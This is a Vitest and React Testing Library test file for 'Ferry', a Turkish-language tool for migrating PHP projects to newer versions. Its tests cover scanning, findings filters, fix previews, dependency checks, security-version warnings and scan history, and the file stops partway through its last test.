import { act, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { describe, expect, it, vi } from "vitest";
import App from "../App";
import { mockApi } from "../lib/mock";
import type { DockerStep, SnapshotConflict } from "../lib/types";

function setup() {
  const user = userEvent.setup();
  render(<App api={mockApi({ delay: 0 })} />);
  return user;
}

const nav = (name: RegExp) => within(screen.getByRole("navigation", { name: "Bölümler" })).getByRole("button", { name });

async function pick(user: ReturnType<typeof userEvent.setup>, name: string, option: string | RegExp) {
  await user.click(await screen.findByRole("combobox", { name }));
  await user.click(await screen.findByRole("option", { name: option }));
}

const targetBox = () => screen.getByRole("combobox", { name: "Hedef PHP sürümü" });
const pickTarget = (user: ReturnType<typeof userEvent.setup>, version: string) => pick(user, "Hedef PHP sürümü", new RegExp(`^PHP ${version.replace(".", "\\.")}`));

async function more(user: ReturnType<typeof userEvent.setup>, name: string | RegExp) {
  await user.click(await screen.findByRole("button", { name: "Diğer" }));
  await user.click(await screen.findByRole("menuitem", { name }));
}

async function compareTargets(user: ReturnType<typeof userEvent.setup>) {
  await user.click(screen.getByRole("button", { name: "Diğer" }));
  await user.click(screen.getByRole("menuitem", { name: "Hedefleri karşılaştır" }));
  await user.click(await screen.findByRole("button", { name: "Karşılaştır" }));
}

async function backups() {
  return within(await screen.findByRole("list", { name: "Yedekler" })).findAllByRole("listitem");
}

async function openAndScan(user: ReturnType<typeof userEvent.setup>) {
  await user.click(await screen.findByRole("button", { name: "Proje klasörü seçin" }));
  await screen.findByRole("heading", { name: "Genel bakış" });
  await user.click(screen.getByRole("button", { name: /Taramayı başlat/ }));
  await screen.findByRole("img", { name: /Hazırlık puanı/ });
}

describe("Ferry app", () => {
  it("stops a running scan and ignores its late result", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let finish: (value: never) => void = () => {};
    vi.spyOn(api, "scanProject").mockImplementation(() => new Promise((resolve) => (finish = resolve as never)));
    const cancel = vi.spyOn(api, "cancelScan");
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: "Proje klasörü seçin" }));
    await user.click(await screen.findByRole("button", { name: /Taramayı başlat/ }));
    await user.click(await screen.findByRole("button", { name: "Durdur" }));
    expect(cancel).toHaveBeenCalled();
    expect(screen.queryByRole("button", { name: "Durdur" })).not.toBeInTheDocument();
    finish(null as never);
    expect(await screen.findByRole("button", { name: /Taramayı başlat/ })).toBeInTheDocument();
    expect(screen.queryByRole("img", { name: /Hazırlık puanı/ })).not.toBeInTheDocument();
  });

  it("shows the welcome screen with navigation disabled", async () => {
    setup();
    expect(await screen.findByRole("heading", { name: "Kodunuz yeni sürüme hazır olsun" })).toBeInTheDocument();
    expect(nav(/Bulgular/)).toBeDisabled();
    expect(screen.getByRole("button", { name: /Ayarlar/ })).toBeEnabled();
  });

  it("keeps recent projects of every supported platform", async () => {
    const recent = [
      { path: "/sites/intranet", name: "intranet", framework: "joomla", openedAt: Date.now() },
      { path: "/sites/wiki", name: "wiki", framework: "mediawiki", openedAt: Date.now() - 1000 },
      { path: "/sites/odd", name: "odd", framework: "cobol", openedAt: Date.now() - 2000 },
    ];
    localStorage.setItem("ferry.recent", JSON.stringify(recent));
    setup();
    expect(await screen.findByText("intranet")).toBeInTheDocument();
    expect(screen.getByText("wiki")).toBeInTheDocument();
    expect(screen.queryByText("odd")).not.toBeInTheDocument();
  });

  it("opens a project, scans it and summarizes risks", async () => {
    const user = setup();
    await openAndScan(user);
    expect(screen.getByText("kuzey-magaza")).toBeInTheDocument();
    expect(screen.getByRole("heading", { level: 2, name: /Sorunların yarısı|Ciddi bir geçiş gerekiyor/ })).toBeInTheDocument();
    expect(screen.getByRole("group", { name: "Dosyalara göre bulgular" })).toBeInTheDocument();
    expect(JSON.parse(localStorage.getItem("ferry.recent")!)[0].name).toBe("kuzey-magaza");
    expect(screen.getByText("mysql_*()")).toBeInTheDocument();
    expect(screen.getByRole("alert")).toHaveTextContent("WordPress 6.2, PHP 8.4 ile çalışmaz.");
    expect(screen.getByText("WordPress sürümünü yükseltin")).toBeInTheDocument();
  });

  it("shows what still stands between the project and the target", async () => {
    const user = setup();
    await openAndScan(user);
    const list = screen.getByRole("list", { name: "Geçiş adımları" });
    const step = (name: RegExp) => within(list).getByRole("button", { name });
    expect(step(/Tarama/).parentElement).toHaveAttribute("data-state", "done");
    expect(step(/Düzeltmeler/).parentElement).toHaveAttribute("data-state", "next");
    expect(step(/Bağımlılıklar/).parentElement).toHaveAttribute("data-state", "blocked");
    expect(step(/Bağımlılıklar/)).toHaveTextContent("3");
    expect(step(/Gerçek test/)).toHaveAttribute("title", "Henüz çalıştırılmadı");
    await user.click(step(/Bağımlılıklar/));
    expect(await screen.findByRole("heading", { name: "Bağımlılıklar" })).toBeInTheDocument();
  });

  it("does not call a clean scan ready while dependencies block it", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.scanProject;
    api.scanProject = async (...args) => {
      const result = await real(...args);
      return { ...result, findings: [], summary: { ...result.summary, total: 0, breaking: 0, deprecated: 0, behavior: 0, auto: 0, likely: 0, manual: 0, filesAffected: 0, score: 100 } };
    };
    render(<App api={api} />);
    await openAndScan(user);
    expect(await screen.findByRole("heading", { name: "Kodda uyumsuzluk bulunmadı" })).toBeInTheDocument();
    expect(screen.queryByRole("heading", { name: "Hedef sürüme hazır" })).not.toBeInTheDocument();
  });

  it("drops the framework warning for targets the framework supports", async () => {
    const user = setup();
    await openAndScan(user);
    await pickTarget(user, "8.2");
    await waitFor(() => expect(targetBox()).toHaveTextContent("PHP 8.2"));
    expect(screen.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("rescans when the target changes after a scan", async () => {
    const user = setup();
    await openAndScan(user);
    await pickTarget(user, "8.3");
    await screen.findByRole("group", { name: "Dosyalara göre bulgular" });
    expect(targetBox()).toHaveTextContent("PHP 8.3");
    expect(screen.queryByRole("button", { name: /Taramayı başlat/ })).not.toBeInTheDocument();
  });

  it("keeps PHP 8.1 out of reach and explains why", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(targetBox());
    const blocked = screen.getByRole("option", { name: /PHP 8\.1/ });
    expect(blocked).toHaveAttribute("aria-disabled", "true");
    expect(blocked).toHaveTextContent("Güvenlik yaması yok");
    await user.click(blocked);
    expect(targetBox()).toHaveTextContent("PHP 8.4");
    await user.keyboard("{Escape}");
    await pickTarget(user, "8.2");
    await screen.findByRole("group", { name: "Dosyalara göre bulgular" });
    targetBox().focus();
    await user.keyboard("{Enter}{ArrowUp}{Enter}");
    await waitFor(() => expect(targetBox()).toHaveTextContent("PHP 8.5"));
  });

  it("explains why PHP 8.1 is closed before the first scan", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: /Proje klasörü/ }));
    const blocked = await screen.findByRole("radio", { name: /8\.1/ });
    expect(blocked).toHaveAttribute("aria-disabled", "true");
    expect(blocked).toHaveAccessibleDescription(/CVE-2026-109618.*8\.2\.35, 8\.3\.36, 8\.4\.27, 8\.5\.12/);
    await user.click(blocked);
    expect(blocked).toHaveAttribute("aria-checked", "false");
  });

  it("falls back to the default target when PHP 8.1 was stored", async () => {
    localStorage.setItem("ferry.target", JSON.stringify("8.1"));
    const user = setup();
    await openAndScan(user);
    expect(targetBox()).toHaveTextContent("PHP 8.4");
  });

  it("warns when the local PHP is affected by the October 2026 vulnerabilities", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const status = await api.toolchainStatus();
    api.toolchainStatus = async () => ({ ...status, php: { path: "/usr/bin/php", version: "8.3.20" } });
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    expect(await screen.findByRole("alert")).toHaveTextContent("PHP 8.3.20, kimlik doğrulaması olmadan kod çalıştırmaya izin veren");
    expect(screen.getByRole("alert")).toHaveTextContent("8.3.36 ya da daha yeni");
  });

  it("flags a vulnerable local PHP in the sidebar and links to Settings", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const status = await api.toolchainStatus();
    api.toolchainStatus = async () => ({ ...status, php: { path: "/usr/bin/php", version: "8.1.34" } });
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: "PHP 8.1.34 güvenlik açığı içeriyor" }));
    expect(await screen.findByRole("heading", { name: "Ayarlar" })).toBeInTheDocument();
  });

  it("shows the usual tool versions when the local PHP is patched", async () => {
    setup();
    expect(await screen.findByText("PHP 8.4.27 · Rector 2.8.3")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /güvenlik açığı/ })).not.toBeInTheDocument();
  });

  it("asks before discarding a computed fix preview when the target changes", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await screen.findByRole("list", { name: "Dosyalar" });
    await user.click(nav(/Genel bakış/));
    await pickTarget(user, "8.3");
    const dialog = await screen.findByRole("dialog", { name: "PHP 8.3 hedefine geçilsin mi?" });
    await user.click(within(dialog).getByRole("button", { name: "Vazgeç" }));
    expect(targetBox()).toHaveTextContent("PHP 8.4");
    await pickTarget(user, "8.3");
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Hedefi değiştir" }));
    await waitFor(() => expect(targetBox()).toHaveTextContent("PHP 8.3"));
    await user.click(nav(/Düzeltmeler/));
    expect(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ })).toBeInTheDocument();
  });

  it("opens findings filtered from the overview", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(screen.getByRole("button", { name: /^Kritik/ }));
    const list = await screen.findByRole("listbox", { name: "Bulgu listesi" });
    within(list)
      .getAllByRole("option")
      .forEach((o) => expect(within(o).getByText("Kritik")).toBeInTheDocument());
    expect(screen.getByRole("radio", { name: /^Kritik/ })).toHaveAttribute("aria-checked", "true");

    await user.click(screen.getByRole("button", { name: "Filtreleri temizle" }));
    await user.click(nav(/Genel bakış/));
    await user.click(screen.getByRole("button", { name: /^mysql_\*\(\)/ }));
    expect(within(await screen.findByRole("listbox", { name: "Bulgu listesi" })).getAllByRole("option")).toHaveLength(3);
    await user.click(screen.getByRole("button", { name: "mysql_*() filtresini kaldır" }));
    expect(within(screen.getByRole("listbox", { name: "Bulgu listesi" })).getAllByRole("option").length).toBeGreaterThan(3);
  });

  it("filters findings and shows details", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const list = await screen.findByRole("listbox", { name: "Bulgu listesi" });
    const all = within(list).getAllByRole("option").length;
    expect(all).toBeGreaterThan(10);

    await pick(user, "Düzeltme türü", /^Elle düzelt/);
    const manual = within(list).getAllByRole("option");
    expect(manual.length).toBeLessThan(all);
    manual.forEach((o) => expect(within(o).queryByText("Otomatik")).not.toBeInTheDocument());

    await user.type(screen.getByRole("searchbox", { name: "Bulgularda ara" }), "strftime");
    expect(within(list).getAllByRole("option")).toHaveLength(1);
    const detail = screen.getByRole("complementary", { name: "Bulgu ayrıntısı" });
    expect(within(detail).getByRole("heading", { name: "strftime()" })).toBeInTheDocument();
    expect(detail).toHaveTextContent("admin/settings-page.php:88");
  });

  it("ignores a finding with a reason and brings it back", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const list = await screen.findByRole("listbox", { name: "Bulgu listesi" });
    const all = within(list).getAllByRole("option").length;
    await user.type(screen.getByRole("searchbox", { name: "Bulgularda ara" }), "strftime");
    const detail = screen.getByRole("complementary", { name: "Bulgu ayrıntısı" });
    await user.click(within(detail).getByRole("button", { name: "Yok say" }));
    const dialog = await screen.findByRole("dialog", { name: "Bu bulgu yok sayılsın mı?" });
    const confirm = within(dialog).getByRole("button", { name: "Yok say" });
    expect(confirm).toBeDisabled();
    await user.type(within(dialog).getByRole("textbox", { name: "Gerekçe" }), "Eski tema, kaldırılacak");
    await user.click(confirm);
    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());

    await user.clear(screen.getByRole("searchbox", { name: "Bulgularda ara" }));
    await waitFor(() => expect(screen.getAllByRole("option")).toHaveLength(all - 1));
    await user.click(screen.getByRole("button", { name: "Yok sayılanlar (1)" }));
    expect(await screen.findByText("Eski tema, kaldırılacak")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Yeniden göster" }));
    await waitFor(() => expect(screen.getAllByRole("option")).toHaveLength(all));
    expect(screen.queryByRole("button", { name: /Yok sayılanlar/ })).not.toBeInTheDocument();
  });

  it("lists PHP extensions and finds compatible package versions", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    await user.click(await screen.findByRole("radio", { name: /PHP eklentileri/ }));
    expect(await screen.findByRole("table", { name: "PHP eklentileri" })).toBeInTheDocument();
    expect(screen.getByText("PHP'den çıkarıldı")).toBeInTheDocument();
    expect(screen.getByText(/composer.json'a eklenebilir: "ext-mysqli": "\*", "ext-gd": "\*"/)).toBeInTheDocument();
    await user.click(screen.getByRole("radio", { name: /Paketler/ }));
    await user.click(await screen.findByRole("button", { name: "Uyumlu sürümleri bul" }));
    expect(await screen.findByText(/Önerilen sürüm: v6.9.1/)).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Uyumlu sürümleri bul" })).not.toBeInTheDocument();
  });

  it("offers to remove ignore entries that no longer match", async () => {
    const user = userEvent.setup();
    const staleIgnores = [{ ruleId: "removed.each", file: "old.php", snippet: "each($a);", reason: "eski" }];
    render(<App api={mockApi({ delay: 0, staleIgnores })} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    expect(await screen.findByText(/1 kayıt artık hiçbir kodla eşleşmiyor/)).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Bu kayıtları sil" }));
    await waitFor(() => expect(screen.queryByText(/artık hiçbir kodla eşleşmiyor/)).not.toBeInTheDocument());
  });

  it("counts the manual findings on the AI page and offers a local model", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: "Proje klasörü seçin" }));
    await user.click(await screen.findByRole("button", { name: /AI önerileri/ }));
    expect(await screen.findByRole("heading", { name: "Elle düzeltmeler için AI önerisi" })).toBeInTheDocument();
    await user.click(nav(/Genel bakış/));
    await user.click(await screen.findByRole("button", { name: /Taramayı başlat/ }));
    await screen.findByRole("img", { name: /Hazırlık puanı/ });
    await user.click(screen.getByRole("button", { name: /AI önerileri/ }));
    expect(await screen.findByRole("heading", { name: /^\d+ elle düzeltme için AI önerisi$/ })).toBeInTheDocument();
    expect(await screen.findByRole("button", { name: "İndir ve kur" })).toBeEnabled();
    expect(screen.getByText(/Ferry bu bilgisayar için Qwen3.5 9B modelini önerir\. 5,3 GB indirilir/)).toBeInTheDocument();
    expect(screen.getByText("Apache-2.0 lisanslı · Hugging Face: unsloth/Qwen3.5-9B-GGUF")).toBeInTheDocument();
    expect(screen.getByText("Açık: Anthropic (claude-opus-5-5)")).toBeInTheDocument();
  });

  it("lists recent projects on the welcome screen and forgets one", async () => {
    localStorage.setItem("ferry.recent", JSON.stringify([{ path: "/p/site", name: "site", framework: "generic", openedAt: Date.now() }]));
    const user = setup();
    expect(await screen.findByRole("button", { name: /\/p\/site/ })).toHaveAttribute("title", "/p/site");
    await user.click(screen.getByRole("button", { name: "site projesini listeden kaldır" }));
    expect(screen.queryByText("Son açılanlar")).not.toBeInTheDocument();
  });

  it("offers a retry when the tools can't be checked", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.toolchainStatus;
    api.toolchainStatus = async () => {
      throw new Error("no");
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    const retry = await screen.findByRole("button", { name: "Yeniden kontrol et" });
    api.toolchainStatus = real;
    await user.click(retry);
    expect(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ })).toBeInTheDocument();
  });

  it("forgets a target comparison after a new scan", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(screen.getByRole("button", { name: "Diğer" }));
    await user.click(await screen.findByRole("menuitem", { name: "Hedefleri karşılaştır" }));
    await user.click(await screen.findByRole("button", { name: "Karşılaştır" }));
    expect(await screen.findByRole("table")).toBeInTheDocument();
    await user.keyboard("{Escape}");
    await user.click(screen.getByRole("button", { name: /Tekrar tara/ }));
    await screen.findByRole("img", { name: /Hazırlık puanı/ });
    await user.click(screen.getByRole("button", { name: "Diğer" }));
    await user.click(await screen.findByRole("menuitem", { name: "Hedefleri karşılaştır" }));
    expect(await screen.findByRole("button", { name: "Karşılaştır" })).toBeInTheDocument();
    expect(screen.queryByRole("table")).not.toBeInTheDocument();
  });

  it("measures and clears the Rector cache in Settings", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    const clear = await screen.findByRole("button", { name: "Önbelleği sil" });
    await waitFor(() => expect(clear).toBeEnabled());
    await user.click(clear);
    expect(await screen.findByText("Önbellek boş.")).toBeInTheDocument();
    expect(clear).toBeDisabled();
  });

  it("says why a disabled button can't be used", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("checkbox", { name: "Uyumluluk" }));
    expect(screen.getByRole("button", { name: /Önizlemeyi hazırla/ })).toHaveAttribute("title", "En az bir seçenek seçin");
  });

  it("says what changed since the previous scan", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await user.click(await screen.findByRole("checkbox", { name: "Tümünü seç" }));
    await user.click(await screen.findByRole("button", { name: "Tümünü uygula" }));
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Uygula" }));
    await screen.findByText("4 dosya güncellendi");
    await user.click(nav(/Geçmiş/));
    const timeline = await screen.findByRole("region", { name: "Zaman çizelgesi" });
    expect(await within(timeline).findByText(/\d+ çözüldü/)).toBeInTheDocument();
  });

  it("charts past scans, shows them as a table and narrows the range", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    const progress = await screen.findByRole("region", { name: "İlerleme" });
    expect(within(progress).getByRole("img", { name: /Hazırlık puanının taramalar boyunca değişimi/ })).toBeInTheDocument();
    await waitFor(() => expect(progress.querySelectorAll(".plot__hit").length).toBeGreaterThan(1));
    expect(within(progress).getByText("15 azaldı")).toBeInTheDocument();
    await user.click(within(progress).getByRole("radio", { name: "Tablo" }));
    const rows = within(progress).getAllByRole("row");
    expect(rows.length).toBeGreaterThan(2);
    expect(within(rows[0]).getByRole("columnheader", { name: "Kritik" })).toBeInTheDocument();
    expect(within(rows[1]).getByText(/^Bugün/)).toBeInTheDocument();
    await user.click(screen.getByRole("radio", { name: "7 gün" }));
    expect(within(progress).getAllByRole("row")).toHaveLength(rows.length);
  });

  it("draws scans saved before severity counts existed", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const at = Math.floor(Date.now() / 1000);
    api.scanHistory = async () => [
      { at: at - 7200, target: "8.4", score: 10, total: 9 },
      { at: at - 3600, target: "8.4", score: 20, total: 8 },
    ];
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    const progress = await screen.findByRole("region", { name: "İlerleme" });
    expect(progress.querySelectorAll(".plot__seg--unknown")).toHaveLength(2);
    expect(within(progress).getByText("Kritik", { selector: "dt" }).nextElementSibling).toHaveTextContent("–");
    expect(within(progress).getByText("1 azaldı")).toBeInTheDocument();
  });

  it("says what a first scan means instead of drawing one point", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    api.scanHistory = async () => [{ at: Math.floor(Date.now() / 1000), target: "8.4", score: 50, total: 3, counts: { breaking: 1, deprecated: 1, behavior: 1, files: 2 } }];
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    expect(await screen.findByText(/İlk tarama/)).toBeInTheDocument();
    expect(screen.queryByRole("img", { name: /taramalar boyunca/ })).not.toBeInTheDocument();
  });

  it("lists scans, fixes and checks on one timeline and hides older ones", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const at = Math.floor(Date.now() / 1000);
    api.scanHistory = async () => Array.from({ length: 12 }, (_, i) => ({ at: at - i * 3600, target: "8.4", score: 50, total: 3 }));
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    const timeline = await screen.findByRole("region", { name: "Zaman çizelgesi" });
    await waitFor(() => expect(within(timeline).getAllByText("Tarama")).toHaveLength(8));
    await user.click(within(timeline).getByRole("button", { name: /kayıt daha/ }));
    expect(within(timeline).getAllByText("Tarama")).toHaveLength(12);
    expect(within(timeline).queryByRole("button", { name: /kayıt daha/ })).not.toBeInTheDocument();
  });

  it("lets all three kinds of fix be chosen together", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const preview = vi.spyOn(api, "rectorPreview");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    const compat = await screen.findByRole("checkbox", { name: "Uyumluluk" });
    const modern = screen.getByRole("checkbox", { name: "Modernleştirme" });
    const pins = screen.getByRole("checkbox", { name: "Sürüm dosyaları" });
    expect(compat).toBeChecked();
    await user.click(compat);
    const start = screen.getByRole("button", { name: /Önizlemeyi hazırla/ });
    expect(start).toBeDisabled();
    await user.click(modern);
    expect(compat).toBeChecked();
    await user.click(compat);
    expect(modern).not.toBeChecked();
    await user.click(compat);
    await user.click(pins);
    await user.click(start);
    await waitFor(() => expect(preview).toHaveBeenCalledWith(expect.any(String), "8.4", "compat", true));
    const list = await screen.findByRole("list", { name: "Dosyalar" });
    const all = within(list).getAllByRole("listitem").length;
    expect(within(list).getByRole("checkbox", { name: "Dockerfile dosyasını seçin" })).toBeChecked();
    const scope = screen.getByRole("radiogroup", { name: "Gösterilen dosyalar" });
    await user.click(within(scope).getByRole("radio", { name: /Sürüm dosyaları/ }));
    expect(within(list).getAllByRole("listitem").length).toBeLessThan(all);
    await user.click(screen.getByRole("button", { name: "Seçimi değiştir" }));
    expect(await screen.findByRole("checkbox", { name: "Sürüm dosyaları" })).toBeChecked();
  });

  it("shows a file side by side and remembers the choice", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await user.click(await screen.findByRole("radio", { name: "Yan yana" }));
    expect(document.querySelector(".diff__split")).not.toBeNull();
    expect(localStorage.getItem("ferry.diffView")).toBe("split");
    await user.click(screen.getByRole("radio", { name: "Birleşik" }));
    expect(document.querySelector(".diff__split")).toBeNull();
  });

  it("explains a finding with its code, history and related findings", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await user.type(await screen.findByRole("searchbox", { name: "Bulgularda ara" }), "mysql_");
    const detail = screen.getByRole("complementary", { name: "Bulgu ayrıntısı" });
    expect(await within(detail).findByText("load_items", { exact: false })).toBeInTheDocument();
    expect(detail.querySelector(".code-line--hit")).not.toBeNull();
    expect(within(detail).getByText("Neden değişti?")).toBeInTheDocument();
    expect(within(detail).getByText(/hazırlanmış sorguları desteklemiyordu/)).toBeInTheDocument();
    expect(within(detail).getByText("Sürüm yolculuğu")).toBeInTheDocument();
    expect(within(detail).getByText("eskidi")).toBeInTheDocument();
    const related = within(detail).getByText("Aynı konudaki bulgular").parentElement!;
    const before = within(detail).getByRole("heading", { level: 2 }).textContent;
    await user.click(within(related).getAllByRole("button")[0]);
    await waitFor(() => expect(within(detail).getByRole("heading", { level: 2 }).textContent).not.toBe(before));
  });

  it("falls back to the snippet when the source can't be read", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    api.sourceLines = () => Promise.reject(new Error("gone"));
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const detail = await screen.findByRole("complementary", { name: "Bulgu ayrıntısı" });
    await waitFor(() => expect(detail.querySelectorAll(".code-line")).toHaveLength(1));
  });

  it("merges an imported runtime log into the findings", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const all = (await screen.findAllByRole("option")).length;
    await more(user, "Log içe aktar");
    expect(await screen.findByText(/php_errors.log: 31 farklı mesaj/)).toBeInTheDocument();
    await waitFor(() => expect(screen.getAllByRole("option")).toHaveLength(all + 1));
    await user.click(screen.getByRole("button", { name: /^Çalışırken görülenler/ }));
    expect(screen.getAllByRole("option")).toHaveLength(4);
    expect(screen.getAllByText(/Çalışırken ×/).length).toBeGreaterThan(0);
    await user.click(screen.getByRole("button", { name: "Log'u kaldır" }));
    await waitFor(() => expect(screen.getAllByRole("option")).toHaveLength(all));
  });

  it("clears the runtime filter with the other filters", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const all = (await screen.findAllByRole("option")).length;
    await more(user, "Log içe aktar");
    await waitFor(() => expect(screen.getAllByRole("option")).toHaveLength(all + 1));
    await user.click(screen.getByRole("button", { name: /^Çalışırken görülenler/ }));
    expect(screen.getAllByRole("option")).toHaveLength(4);
    await user.click(screen.getByRole("button", { name: "Filtreleri temizle" }));
    expect(screen.getAllByRole("option")).toHaveLength(all + 1);
  });

  it("keeps the checks available when nothing is found", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.scanProject;
    api.scanProject = async (...args) => ({ ...(await real(...args)), findings: [] });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    expect(await screen.findByText("Sorun yok")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Diğer" }));
    expect(await screen.findByRole("menuitem", { name: "Log içe aktar" })).toBeInTheDocument();
    expect(await screen.findByRole("menuitem", { name: "Sözdizimini PHP 8.4.27 ile denetle" })).toBeInTheDocument();
  });

  it("keeps one finding focusable when a filter shrinks a long list", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.scanProject;
    api.scanProject = async (...args) => {
      const result = await real(...args);
      const base = result.findings[0];
      const findings = Array.from({ length: 420 }, (_, n) => ({ ...base, id: `f${n}`, file: `src/f${n}.php`, line: 1 }));
      return { ...result, findings };
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const list = await screen.findByRole("listbox", { name: "Bulgu listesi" });
    within(list).getAllByRole("option")[0].focus();
    await user.keyboard("{End}");
    await user.type(screen.getByRole("searchbox", { name: "Bulgularda ara" }), "php");
    await waitFor(() => expect(within(list).getAllByRole("option").filter((o) => o.tabIndex === 0)).toHaveLength(1));
  });

  it("resizes the findings panels from the keyboard and remembers it", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    const splitter = await screen.findByRole("separator", { name: "Panelleri yeniden boyutlandır" });
    splitter.focus();
    await user.keyboard("{ArrowLeft}");
    expect(splitter.parentElement!.style.getPropertyValue("--split-col")).toMatch(/px$/);
    expect(localStorage.getItem("ferry.split.findings.cols")).not.toBeNull();
    await user.dblClick(splitter);
    expect(splitter.parentElement!.style.getPropertyValue("--split-col")).toBe("");
    expect(localStorage.getItem("ferry.split.findings.cols")).toBeNull();
  });

  it("puts focus in the reason field of the ignore dialog", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await screen.findByRole("listbox", { name: "Bulgu listesi" });
    const detail = screen.getByRole("complementary", { name: "Bulgu ayrıntısı" });
    await user.click(within(detail).getByRole("button", { name: "Yok say" }));
    const dialog = await screen.findByRole("dialog", { name: "Bu bulgu yok sayılsın mı?" });
    expect(within(dialog).getByRole("textbox", { name: "Gerekçe" })).toHaveFocus();
  });

  it("creates a server probe and compares its output", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    await user.click(await screen.findByRole("radio", { name: /PHP eklentileri/ }));
    await user.click(await screen.findByRole("button", { name: "Yoklama dosyası oluştur" }));
    expect(await screen.findByText(/ferry-probe.php\?token=3f9c2a7be41d08c6a5e2f1b07d9c3e88/)).toBeInTheDocument();
    const output = '{"ferryProbe":1,"php":"8.2.10","sapi":"fpm-fcgi","os":"Linux","server":"nginx","extensions":["core","curl","mysqli"],"ini":{"memory_limit":"256M","disable_functions":"exec"}}';
    const box = screen.getByRole("textbox", { name: "Yoklama çıktısı" });
    await user.click(box);
    await user.paste(output);
    const table = await screen.findByRole("table", { name: "Sunucu" });
    expect(within(table).getByText("Hedef sürümün (PHP 8.4) altında")).toBeInTheDocument();
    expect(within(table).getByText("imap")).toBeInTheDocument();
    expect(within(table).getByText(/php_value satırları 500 hatası verir/)).toBeInTheDocument();
  });

  it("lists WordPress plugins and checks wordpress.org", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    const table = await screen.findByRole("table", { name: "WordPress eklentileri ve temaları" });
    expect(within(table).getByText("Contact Form 7")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "En son sürümleri bul" }));
    expect(await within(table).findByText("6.2.4")).toBeInTheDocument();
    expect(within(table).getByText("Kaldırıldı")).toBeInTheDocument();
  });

  it("leaves files to review unselected and notes the ones not viewed", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    const files = await screen.findByRole("list", { name: "Dosyalar" });
    const box = (file: string) => screen.getByRole("checkbox", { name: `${file} dosyasını seçin` });
    expect(box("includes/class-mailer.php")).not.toBeChecked();
    expect(box("includes/helpers.php")).toBeChecked();
    await waitFor(() => expect(within(files).getAllByText("Bakılmadı")).toHaveLength(1));
    await user.click(box("includes/class-mailer.php"));
    await user.click(screen.getByRole("button", { name: /dosyayı uygula/ }));
